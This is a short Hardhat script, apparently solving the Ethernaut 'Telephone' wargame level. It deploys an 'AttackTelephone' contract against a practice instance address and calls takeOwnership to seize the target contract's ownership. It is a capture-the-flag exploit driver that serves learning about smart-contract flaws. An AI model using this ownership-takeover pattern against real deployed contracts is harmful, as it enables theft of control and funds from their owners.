import assert from 'assert';

import { ethers } from 'hardhat';

const main = async () => {
  const ContractFactory = await ethers.getContractFactory('AttackTelephone');

  const telephoneAddress = '0x89C4D8A7818BFbadfD5D0A8c3D3B99b1AdE071A2'; // Get new instance in Ethernaut website.
  const contract = await ContractFactory.deploy(telephoneAddress);

  const [owner] = await ethers.getSigners();

  await contract.deployed();
  console.log('Contract deployed to:', contract.address);

  await contract.connect(owner).takeOwnership(owner.address);
  const ownerAddress = await contract.getOwner();

  console.log(`Telephone's owner : ${ownerAddress}`);
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
